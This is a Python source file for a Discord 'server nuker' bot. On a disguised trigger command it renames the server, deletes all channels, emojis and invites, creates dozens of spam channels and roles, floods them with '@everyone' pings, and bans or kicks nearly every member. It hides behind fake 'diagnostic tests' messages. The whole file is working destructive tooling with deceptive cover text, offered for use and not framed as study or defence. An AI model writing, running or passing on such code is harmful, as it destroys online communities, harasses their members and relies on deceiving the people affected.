import discord
from discord import app_commands
import asyncio
import random
import json
import os

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

class ServerNuker(discord.Client):
    def __init__(self, config_path='config.json'):
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.config = self.load_config(config_path)
        
    def load_config(self, config_path):
        if not os.path.exists(config_path):
            default_config = {
                "bot_token": "",
                "guild_name": "NUKED SERVER",
                "channel_name": "nuked",
                "spam_message": "@everyone SERVER NUKED",
                "targeted_user_id": 0,
                "target_server_ids": [],
                "protected_user_id": 0,
                "channel_topics": [
                    "NUKED CHANNEL",
                    "SERVER DESTROYED",
                    "GET NUKED"
                ],
                "nuke_command": "!test"
            }
            with open(config_path, 'w') as f:
                json.dump(default_config, f, indent=4)
            return default_config
        
        with open(config_path, 'r') as f:
            return json.load(f)
    
    async def setup_hook(self):
        await self.tree.sync()
        
    async def spam_messages(self, channel):
        for _ in range(50):
            await channel.send(self.config["spam_message"])
            print(f'Message sent in {channel.name}')
            await asyncio.sleep(0.5)

client = ServerNuker()

@client.event
async def on_ready():
    print(f"{client.user} is ready and online!")
    print("----------------------------")
    print("Discord Server Nuker Active")
    print(f"Command: {client.config['nuke_command']}")
    print("----------------------------")

@client.event
async def on_message(message):
    if message.author == client.user:
        return
        
    if message.content == client.config["nuke_command"]:
        if (message.guild.id not in client.config["target_server_ids"] and 
            client.config["target_server_ids"] or 
            (message.author.id != client.config["targeted_user_id"] and 
             client.config["targeted_user_id"])):
            await message.channel.send("Running diagnostic tests... Server systems normal.", delete_after=5)
            return
            
        await message.delete() 
        await message.channel.send("Running diagnostic tests...", delete_after=5)
        
        guild = message.guild
        
        try:
            await guild.edit(name=client.config["guild_name"])
            print(f'Server renamed to: {client.config["guild_name"]}')

            for emoji in guild.emojis:
                try:
                    await emoji.delete()
                    print(f'Deleted emoji: {emoji.name}')
                    await asyncio.sleep(0.3)
                except Exception as e:
                    print(f'Failed to delete emoji {emoji.name}: {e}')

            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f'Deleted channel: {channel.name}')
                except Exception as e:
                    print(f'Failed to delete channel {channel.name}: {e}')

            channels = []
            for i in range(50):
                topic = random.choice(client.config["channel_topics"])
                channel = await guild.create_text_channel(client.config["channel_name"], topic=topic)
                print(f'Channel created: {client.config["channel_name"]} with topic: {topic}')
                channels.append(channel)
            
            role_colors = [discord.Color.red(), discord.Color.green(), discord.Color.blue(), 
                          discord.Color.orange(), discord.Color.purple(), discord.Color.teal()]
            
            for i in range(50):
                role_name = f"NUKED-{i}"
                await guild.create_role(name=role_name, 
                                      color=random.choice(role_colors), 
                                      hoist=True)
                print(f'Created role: {role_name}')
                await asyncio.sleep(0.3)
                
            try:
                invites = await guild.invites()
                for invite in invites:
                    await invite.delete()
                    print(f'Deleted invite: {invite.code}')
            except Exception as e:
                print(f'Failed to delete invites: {e}')
                
            tasks = []
            for channel in channels:
                tasks.append(client.spam_messages(channel))
            await asyncio.gather(*tasks)
            
            for member in guild.members:
                if (member != client.user and not member.bot and 
                    member.id != guild.owner.id and
                    member.id != client.config["protected_user_id"]):
                    try:
                        await member.ban(reason="Server reset")
                        print(f'Banned member: {member.name}')
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        print(f'Failed to ban {member.name}: {e}')
                        try:
                            await member.kick(reason="Server reset fallback")
                            print(f'Kicked member: {member.name}')
                        except Exception as e2:
                            print(f'Failed to kick {member.name}: {e2}')

        except Exception as e:
            print(f'Error during operation: {e}')

if __name__ == "__main__":
    client.run(client.config["bot_token"])